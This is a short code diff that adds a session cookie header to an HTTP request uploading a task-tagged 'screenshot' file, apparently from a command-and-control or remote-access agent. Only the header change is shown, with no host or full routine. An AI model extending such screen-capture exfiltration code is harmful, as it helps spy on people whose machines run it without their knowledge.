@@ -363,6 +363,7 @@ namespace Task
         wHeaders += L"X-UUID: " + pState->wUUID + L"\r\n";
         wHeaders += L"X-TASK: " + pState->wTask + L"\r\n";
         wHeaders += L"X-FILE: screenshot\r\n";
+        wHeaders += L"Cookie: session_id=" + pState->wSessionID + L"\r\n";
 
         BOOL bResult = System::Http::FileUpload(
             pState->pProcs,
